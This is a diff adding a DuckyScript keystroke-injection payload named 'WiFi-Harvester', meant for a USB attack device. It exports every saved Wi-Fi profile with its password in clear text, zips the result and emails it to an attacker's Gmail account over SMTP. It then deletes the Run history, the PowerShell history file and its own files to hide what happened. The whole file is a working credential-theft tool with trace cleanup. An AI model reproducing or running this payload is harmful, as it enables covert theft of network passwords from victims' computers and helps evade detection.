@@ -1,0 +1,74 @@
+REM Title: WiFi-Harvester
+REM Author: tony
+REM Based on the code of: Siem TTommy
+REM Fixed and reworked by Joe'vil
+REM: Version 1.1
+DELAY 2000
+GUI d
+DELAY 150
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 500
+STRING cd Desktop
+ENTER
+STRING cd OneDrive/desktop
+ENTER
+STRING mkdir A
+ENTER
+STRING cd A
+ENTER
+STRING netsh wlan export profile key=clear 
+ENTER
+DELAY 500
+STRING cd ..
+ENTER
+STRING powershell
+ENTER
+STRING Compress-Archive -Path A -DestinationPath A.zip
+ENTER
+REM --> Report
+REM --> Allow less secure app here https://myaccount.google.com/lesssecureapps
+DELAY 800
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER-EMAIL@gmail.com', 'SENDER-PASSWORD')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'SENDER-EMAIL@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('RECEIVER-EMAIL@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = "Password-Report"
+ENTER
+STRING $ReportEmail.Body = "get trolled lmao"
+ENTER
+STRING $ReportEmail.Attachments.Add("A.zip")
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 800
+REM --> Clean up
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+STRING cd ..
+ENTER
+STRING cd AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+ENTER
+STRING del ConsoleHost_history.txt
+ENTER
+STRING exit
+ENTER
+DELAY 100
+STRING del /Q /S A & rmdir A
+ENTER
+STRING S
+ENTER
+STRING del /Q A.zip & exit
+ENTER
